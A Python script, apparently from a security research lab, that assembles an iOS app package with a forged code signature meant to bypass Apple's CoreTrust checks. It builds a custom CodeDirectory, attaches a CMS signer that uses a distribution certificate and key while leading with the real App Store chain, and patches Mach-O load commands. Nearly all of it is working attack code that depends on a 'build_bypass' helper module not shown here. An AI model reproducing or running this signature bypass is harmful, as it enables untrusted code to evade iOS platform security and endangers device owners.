#!/usr/bin/env python3
"""prof3: our CD is the MAIN CD (so SecStaticCode code hashes match), the CMS
signer is the real distribution cert (trust + profile), and the certificate set
still leads with the real App Store chain (CoreTrust policy side)."""
import os, sys, struct, hashlib, plistlib, shutil
sys.path.insert(0, '/home/femboychik/asuka4scape/06_CORETRUST/ctlab/bypass')
import build_bypass as bb

HERE = '/home/femboychik/asuka4scape/06_CORETRUST/ctlab/bypass'
BUNDLE = '/tmp/ctprof3/Payload/ctlab.app'
OUT = '/tmp/ctprof3/ctlab-prof3.ipa'
ENTS = '/tmp/ctprof/ents.plist'
BASE = os.path.join(HERE, 'work/base_ctlab')
CRT = os.path.join(HERE, 'work/CodeResources.template')
TEAM = '8F9U9JSYJ9'


def main():
    info_path = os.path.join(BUNDLE, 'Info.plist')
    info = open(info_path, 'rb').read()
    pl = plistlib.loads(info)
    ident = pl['CFBundleIdentifier']
    binary_name = pl['CFBundleExecutable']
    bin_path = os.path.join(BUNDLE, binary_name)
    shutil.copyfile(BASE, bin_path)
    os.chmod(bin_path, 0o755)

    ents = plistlib.load(open(ENTS, 'rb'))
    ent_xml = plistlib.dumps(ents, fmt=plistlib.FMT_XML, sort_keys=True)
    ent_blob = struct.pack('>II', 0xfade7171, 8 + len(ent_xml)) + ent_xml
    der_payload = bb.build_der_entitlements(ents)
    der_blob = struct.pack('>II', 0xfade7172, 8 + len(der_payload)) + der_payload
    req_blob = struct.pack('>III', 0xfade0c01, 12, 0)

    os.makedirs(os.path.join(BUNDLE, '_CodeSignature'), exist_ok=True)
    cr = bb.build_code_resources(BUNDLE, CRT, binary_name)
    open(os.path.join(BUNDLE, '_CodeSignature', 'CodeResources'), 'wb').write(cr)

    d = open(bin_path, 'rb').read()
    lc_off = bb.find_lc(d, 0x1d)
    old_off = struct.unpack_from('<I', d, lc_off + 8)[0]
    base = bytearray(d[:old_off])
    sig_off = (len(base) + 15) & ~15
    if len(base) < sig_off:
        base += b'\0' * (sig_off - len(base))
    text = bb.find_segment(d, '__TEXT')
    exec_limit = struct.unpack_from('<Q', d, text + 48)[0] if text else 0x4000

    template = open(os.path.join(HERE, 'AppStoreSignatureBlob.bin'), 'rb').read()[8:]
    dist_key = bb.serialization.load_der_private_key(open(os.path.join(HERE, 'dist_key.der'), 'rb').read(), password=None)
    dist_leaf = open(os.path.join(HERE, 'dist_leaf.der'), 'rb').read()
    wwdr = open(os.path.join(HERE, 'wwdr.der'), 'rb').read()

    def make(sb_len):
        b = bytearray(base)
        struct.pack_into('<II', b, lc_off + 8, sig_off, sb_len)
        le = bb.find_segment(bytes(b), '__LINKEDIT')
        le_fileoff = struct.unpack_from('<Q', b, le + 40)[0]
        le_size = sig_off + sb_len - le_fileoff
        struct.pack_into('<Q', b, le + 32, (le_size + 0x3fff) & ~0x3fff)
        struct.pack_into('<Q', b, le + 48, le_size)
        code = bytes(b)
        slots = {
            1: hashlib.sha256(info).digest(),
            2: hashlib.sha256(req_blob).digest(),
            3: hashlib.sha256(cr).digest(),
            5: hashlib.sha256(ent_blob).digest(),
            7: hashlib.sha256(der_blob).digest(),
        }
        cd = bb.build_cd(code, sig_off, ident, TEAM, exec_limit, slots)
        cms_data = bb.add_dist_signer(template, cd, cd, dist_key, dist_leaf, wwdr)
        cms_blob = struct.pack('>II', 0xfade0b01, 8 + len(cms_data)) + cms_data
        sb = bb.superblob([(0, cd), (2, req_blob), (5, ent_blob), (7, der_blob),
                           (0x10000, cms_blob)])
        return cd, sb

    sb_len = 0
    for _ in range(8):
        cd, sb = make(sb_len)
        if len(sb) == sb_len:
            break
        sb_len = len(sb)
    else:
        raise SystemExit('no converge')
    out = bytearray(base)
    struct.pack_into('<II', out, lc_off + 8, sig_off, len(sb))
    le = bb.find_segment(bytes(out), '__LINKEDIT')
    le_fileoff = struct.unpack_from('<Q', out, le + 40)[0]
    le_size = sig_off + len(sb) - le_fileoff
    struct.pack_into('<Q', out, le + 32, (le_size + 0x3fff) & ~0x3fff)
    struct.pack_into('<Q', out, le + 48, le_size)
    out += sb
    open(bin_path, 'wb').write(out)
    os.chmod(bin_path, 0o755)
    print('built', bin_path, 'size', len(out), 'sig', hex(sig_off), 'sb', len(sb),
          'cd256', hashlib.sha256(cd).hexdigest())
    bb.make_ipa(BUNDLE, OUT)


if __name__ == '__main__':
    main()
